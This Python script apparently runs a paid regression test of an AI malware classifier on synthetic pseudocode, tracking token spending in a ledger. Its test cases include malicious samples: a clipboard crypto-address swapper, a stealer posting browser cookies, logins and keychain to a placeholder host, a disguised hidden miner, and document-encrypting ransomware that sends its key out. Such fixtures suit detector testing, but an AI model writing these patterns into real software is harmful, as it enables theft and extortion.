#!/usr/bin/env python3
"""Opt-in paid semantic regression over inert code text, with a persistent cost ledger.

This evaluates model interpretation separately from REA extraction. It never executes code.
Run while production admissions are drained; supply its current spending snapshot so this
suite fits the unchanged daily/monthly allowance. The normal service still owns production jobs.
The ledger and assessment are private operator artifacts and must stay outside Git.
"""

import argparse
from datetime import datetime, timedelta, timezone
import json
from pathlib import Path
import sys
import time

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / 'worker'))
from machsentry_worker.ai_stage import AiStage
from machsentry_worker.config import Secret
from machsentry_worker.job import parse_claim
from machsentry_worker.site_api import SiteError

MODEL = 'gpt-5.4-mini-2026-03-17'
CASES = [
    ('explicit_user_clipboard_copy', 'no_malicious_behavior_observed', '''
void copy_user_selection(Document *doc, Event *event) {
  if (event->kind != USER_CLICK_COPY || !event->userInitiated) return;
  String text = doc->selectedText;
  NSPasteboard_clearContents(NSPasteboard_generalPasteboard());
  NSPasteboard_setString(NSPasteboard_generalPasteboard(), text, NSPasteboardTypeString);
}'''),
    ('clipboard_crypto_replacement', 'malicious', '''
void background_poll(void) {
  while (1) {
    String original = NSPasteboard_stringForType(NSPasteboard_generalPasteboard(), NSPasteboardTypeString);
    if (regex_match(original, "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$")) {
      NSPasteboard_clearContents(NSPasteboard_generalPasteboard());
      NSPasteboard_setString(NSPasteboard_generalPasteboard(), "1AttackerWalletPlaceholderTESTONLY", NSPasteboardTypeString);
    }
    sleep(1);
  }
}'''),
    ('credential_collection_and_send', 'malicious', '''
void collect_and_send(void) {
  Bytes cookies = read_file("~/Library/Application Support/Browser/Default/Cookies");
  Bytes logins = read_file("~/Library/Application Support/Browser/Default/Login Data");
  Bytes keychain = read_file("~/Library/Keychains/login.keychain-db");
  Bytes archive = zip_bytes(cookies, logins, keychain);
  http_post("https://collector.example.invalid/stolen", archive);
}'''),
    ('unapproved_background_miner', 'malicious', '''
void install_background_miner(void) {
  write_launchagent("~/Library/LaunchAgents/com.apple.fakehelper.plist", "/tmp/hidden-miner", KEEP_ALIVE_TRUE);
  process_exec("/tmp/hidden-miner", "--pool stratum+tcp://pool.example.invalid:4444 --wallet ATTACKER_TEST_WALLET --background --max-cpu 95");
  hide_dock_and_status_icon();
}'''),
    ('encrypt_documents_extortion', 'malicious', '''
void lock_documents(void) {
  Bytes key = secure_random(32);
  for (Path path : recursive_files("~/Documents")) {
    Bytes original = read_file(path);
    write_file(path + ".locked", aes_encrypt(original, key));
    unlink(path);
  }
  http_post("https://keys.example.invalid/register", key);
  write_file("~/Documents/READ_ME.txt", "Pay the attacker to recover your encrypted documents.");
}'''),
    ('verified_user_requested_update', 'no_malicious_behavior_observed', '''
void apply_update(Event *event, Bundle *update) {
  if (!event->userInitiated || !event->confirmedUpdate) return;
  if (!verify_signature(update, PINNED_VENDOR_PUBLIC_KEY)) return;
  if (!verify_manifest_hashes(update)) return;
  replace_own_application_bundle(update);
  show_update_completed();
}'''),
]


class Ledger:
    def __init__(self, path, *, total_cap, global_day, global_month):
        self.path = path
        self.total_cap, self.global_day, self.global_month = total_cap, global_day, global_month
        self.records = []

    def save(self):
        temporary = self.path.with_suffix('.tmp')
        temporary.write_text(json.dumps({'records': self.records, 'cap_micros': self.total_cap}, indent=2), encoding='utf-8')
        temporary.replace(self.path)

    def ai_reserve(self, job, attempt, lease, index, input_tokens, output_tokens, model, version):
        if any(row['outcome'] in ('reserved', 'usage_unknown') for row in self.records):
            return {'granted': False, 'reason': 'job_budget'}
        spent = sum(row['cost_micros'] for row in self.records)
        reserved = (input_tokens * 750_000 + output_tokens * 4_500_000 + 999_999) // 1_000_000
        if (model != MODEL or index >= 12 or input_tokens > 40000
                or sum(row.get('output_tokens', 0) for row in self.records) + output_tokens > 16000):
            return {'granted': False, 'reason': 'token_limit'}
        if spent + reserved > self.total_cap:
            return {'granted': False, 'reason': 'job_budget'}
        if self.global_day + spent + reserved > 5_000_000:
            return {'granted': False, 'reason': 'daily_budget'}
        if self.global_month + spent + reserved > 40_000_000:
            return {'granted': False, 'reason': 'monthly_budget'}
        identifier = f'semantic_eval_{index}'
        self.records.append({'call_id': identifier, 'outcome': 'reserved', 'cost_micros': reserved,
                             'input_reserved': input_tokens, 'output_reserved': output_tokens})
        self.save()
        return {'granted': True, 'callId': identifier}

    def ai_settle(self, job, attempt, lease, call_id, outcome, *, usage=None, request_id=None, error_code=None):
        row = next(item for item in self.records if item['call_id'] == call_id)
        if row['outcome'] != 'reserved':
            raise SiteError('settlement_repeated')
        cost = row['cost_micros']
        if outcome == 'succeeded' and usage:
            cost = ((usage['inputTokens'] - usage['cachedInputTokens']) * 750_000
                    + usage['cachedInputTokens'] * 75_000 + usage['outputTokens'] * 4_500_000 + 999_999) // 1_000_000
        elif outcome == 'failed_not_billed':
            cost = 0
        row.update(outcome=outcome, cost_micros=cost, request_id=request_id, usage=usage,
                   output_tokens=usage['outputTokens'] if usage else row['output_reserved'])
        self.save()
        return {'costMicros': cost}


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--run-paid', action='store_true', required=True)
    parser.add_argument('--output', type=Path, required=True)
    parser.add_argument('--aws-key-parameter', required=True)
    parser.add_argument('--region', default='us-east-2')
    parser.add_argument('--global-day-micros', type=int, required=True)
    parser.add_argument('--global-month-micros', type=int, required=True)
    args = parser.parse_args()
    if not 0 <= args.global_day_micros <= 5_000_000 or not 0 <= args.global_month_micros <= 40_000_000:
        parser.error('global spending snapshot outside the configured ceilings')
    args.output.mkdir(parents=True, exist_ok=False)
    import boto3
    key = boto3.client('ssm', region_name=args.region).get_parameter(Name=args.aws_key_parameter, WithDecryption=True)['Parameter']['Value']
    ledger = Ledger(args.output / 'cost-ledger.json', total_cap=100000,
                    global_day=args.global_day_micros, global_month=args.global_month_micros)
    functions = [{'architecture': 'arm64', 'slice': 0, 'address': hex(0x100000100 + index * 32),
                  'names': [f'func_{index}'], 'pseudocode': code.strip(), 'finding_ids': [], 'references': [],
                  'direct_calls': [], 'unresolved_calls': [], 'limitations': [], 'facet_availability': {}}
                 for index, (name, _, code) in enumerate(CASES)]
    report = {'analysis_status': 'partial', 'functions': functions, 'findings': [], 'evidence': [],
              'slices': [{'index': 0, 'architecture': 'arm64', 'status': 'analyzed'}],
              'coverage': {'analyzed_slice_count': 1, 'slices': [{'slice': 0, 'procedure_inventory_count': len(functions),
                            'functions_inspected': len(functions), 'functions_omitted': 0}]},
              'risk': {'value': 0, 'verdict': 'inconclusive'}, 'yara': {'status': 'not_generated'},
              'scripts': [], 'ioc_candidates': []}
    (args.output / 'synthetic-input.json').write_text(json.dumps(report, indent=2), encoding='utf-8')
    claim = parse_claim({'id': 'semantic_eval', 'attempt': 1, 'leaseToken': 'operator-evaluation-only', 'locale': 'en-US',
        'sample': {'name': 'INERT_SYNTHETIC_CODE_TEXT', 'sha256': '0' * 64, 'size': 1, 'architectures': ['arm64']},
        'download': {'url': 'https://example.invalid/never-downloaded'},
        'deadlineAt': (datetime.now(timezone.utc) + timedelta(seconds=540)).isoformat(),
        'limits': {'staticSeconds': 1200, 'aiSeconds': 540, 'finalizeSeconds': 120, 'maxFunctions': 128,
                   'memoryBytes': 3 * 1024**3, 'pids': 256, 'diskBytes': 4 * 1024**3},
        'ai': {'model': MODEL, 'promptVersion': 'unpacked-analysis-ai-v5', 'maxCalls': 12,
               'maxInputTokensPerCall': 40000, 'maxOutputTokensFirstCall': 4000, 'maxOutputTokensPerJob': 16000}})
    start = time.monotonic()
    result = AiStage(ledger, Secret(key), MODEL).run(claim, report, start + 540)
    (args.output / 'ai-assessment.json').write_text(json.dumps(result.assessment(), ensure_ascii=False, indent=2), encoding='utf-8')
    actual = {item['address']: item['verdict'] for item in (result.review or {}).get('functions', [])}
    cases = [{'name': name, 'expected': expected, 'actual': actual.get(functions[index]['address'])}
             for index, (name, expected, _) in enumerate(CASES)]
    verified = result.status == 'completed' and all(row['actual'] == row['expected'] for row in cases)
    summary = {'verified': verified, 'scope': 'synthetic_code_text_model_regression_not_binary_accuracy',
               'model': MODEL, 'elapsed_seconds': round(time.monotonic() - start, 3), 'cases': cases,
               'status': result.status, 'code': result.error_code, 'calls': len(result.calls),
               'input_tokens': result.input_tokens, 'output_tokens': result.output_tokens, 'cost_micros': result.cost_micros,
               'coverage': (result.review or {}).get('coverage')}
    (args.output / 'verification.json').write_text(json.dumps(summary, indent=2), encoding='utf-8')
    print(json.dumps(summary, indent=2))
    return 0 if verified else 1


if __name__ == '__main__':
    raise SystemExit(main())
